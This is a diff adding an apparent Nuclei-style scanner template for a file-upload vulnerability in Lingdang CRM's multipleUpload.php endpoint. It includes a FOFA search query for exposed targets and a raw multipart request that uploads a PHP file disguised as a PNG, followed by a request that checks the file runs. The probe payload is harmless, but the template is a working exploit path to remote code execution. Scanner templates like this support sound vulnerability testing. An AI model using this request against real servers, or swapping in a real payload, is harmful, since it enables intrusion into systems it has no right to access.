@@ -1,0 +1,39 @@
+id: lingdang-crm-multipleupload-upload
+
+info:
+  name: "灵当CRM multipleUpload.php 组件文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="include/js/ldAjax.js"
+          灵当CRM multipleUpload.php 接口存在文件上传功能安全缺陷，攻击者可远程利用该漏洞上传恶意文件，导致服务器端代码执行及权限提升。成功利用可实现后门植入并完全控制目标Web服务器。
+  tags: 灵当CRM
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
+
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR
+    Content-Disposition: form-data; name="file"; filename="NTest.php"
+    Content-Type: image/png
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR--
+- raw:
+  - |
+    GET /crm/storage/2024/September/week2/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
